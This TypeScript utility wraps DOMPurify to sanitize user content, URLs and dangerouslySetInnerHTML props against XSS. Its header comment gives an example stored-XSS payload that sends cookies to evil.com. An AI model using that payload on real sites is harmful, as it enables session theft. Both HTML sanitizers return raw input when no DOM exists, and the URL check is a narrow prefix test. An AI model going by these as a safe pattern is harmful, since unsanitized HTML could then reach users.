/**
 * XSS Sanitization Utility
 * --------------------------
 * WHY: Any time user-generated content (chat messages, company names, document
 * text, job descriptions) is rendered as HTML — via dangerouslySetInnerHTML or
 * inserted via innerHTML — it must be sanitized first. Without sanitization,
 * a stored XSS attack is trivially possible: a malicious user submits a string
 * like <script>fetch('https://evil.com?c='+document.cookie)</script>, it gets
 * saved to the database, and rendered for every other user who views that page.
 *
 * DOMPurify removes all tags and attributes that are not on its explicit
 * allowlist. It is DOM-aware (not regex-based) so it handles all encoding tricks
 * and mutation-XSS vectors that regex sanitizers miss.
 *
 * USAGE:
 *   // Safe plain text (no HTML allowed):
 *   <p>{sanitizeText(userProvidedString)}</p>
 *
 *   // Safe HTML (limited formatting tags allowed):
 *   <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(userProvidedHtml) }} />
 *
 *   // Safe URL (blocks javascript: and data: URIs):
 *   <a href={sanitizeUrl(userProvidedUrl)}>Link</a>
 *
 * SSR NOTE: DOMPurify requires a DOM. On the server (Next.js SSR/RSC) it falls
 * back to a no-op with a console warning. Use sanitization in client components
 * or pass pre-sanitized data from the server.
 */

import DOMPurify from 'dompurify';

// ---------------------------------------------------------------------------
// Type-safe config objects
// ---------------------------------------------------------------------------

interface PurifyConfig {
  ALLOWED_TAGS: string[];
  ALLOWED_ATTR: string[];
}

/**
 * Strips ALL HTML — returns plain text only.
 * Use for names, titles, descriptions, any field where HTML is not needed.
 */
const PLAIN_TEXT_CONFIG: PurifyConfig = {
  ALLOWED_TAGS: [],
  ALLOWED_ATTR: [],
};

/**
 * Allows a minimal set of safe formatting tags.
 * Use for rich-text fields like document previews or markdown-rendered content.
 */
const RICH_TEXT_CONFIG: PurifyConfig = {
  ALLOWED_TAGS: [
    'b', 'i', 'em', 'strong', 'u',
    'p', 'br', 'ul', 'ol', 'li',
    'blockquote', 'code', 'pre',
  ],
  // No attributes — blocks event handlers and style injection
  ALLOWED_ATTR: [],
};

// ---------------------------------------------------------------------------
// Guards
// ---------------------------------------------------------------------------

function isDomAvailable(): boolean {
  return typeof window !== 'undefined' && typeof document !== 'undefined';
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Sanitize a string to plain text — strips all HTML tags.
 * Safe for React text nodes and attribute values.
 */
export function sanitizeText(input: string): string {
  if (!input) return '';
  if (!isDomAvailable()) {
    console.warn('[sanitize] DOMPurify not available in SSR context.');
    return input;
  }
  return String(DOMPurify.sanitize(input, PLAIN_TEXT_CONFIG));
}

/**
 * Sanitize HTML for use with dangerouslySetInnerHTML.
 * Allows a minimal set of formatting tags; strips all scripts and event handlers.
 */
export function sanitizeHtml(input: string): string {
  if (!input) return '';
  if (!isDomAvailable()) {
    console.warn('[sanitize] DOMPurify not available in SSR context.');
    return input;
  }
  return String(DOMPurify.sanitize(input, RICH_TEXT_CONFIG));
}

/**
 * Sanitize a URL — blocks javascript: and data: URIs which can execute scripts.
 * Returns '#' for any URL that fails validation.
 *
 * @example
 *   <a href={sanitizeUrl(user.websiteUrl)}>Visit site</a>
 */
export function sanitizeUrl(input: string): string {
  if (!input) return '#';
  const trimmed = input.trim().toLowerCase();
  if (trimmed.startsWith('javascript:') || trimmed.startsWith('data:')) {
    console.warn(`[sanitize] Blocked potentially dangerous URL scheme: ${trimmed.slice(0, 30)}`);
    return '#';
  }
  return input.trim();
}

/**
 * React-ready wrapper: returns a props object for dangerouslySetInnerHTML.
 *
 * @example
 *   <div {...dangerousHtml(contractPreview)} />
 */
export function dangerousHtml(input: string): { dangerouslySetInnerHTML: { __html: string } } {
  return { dangerouslySetInnerHTML: { __html: sanitizeHtml(input) } };
}
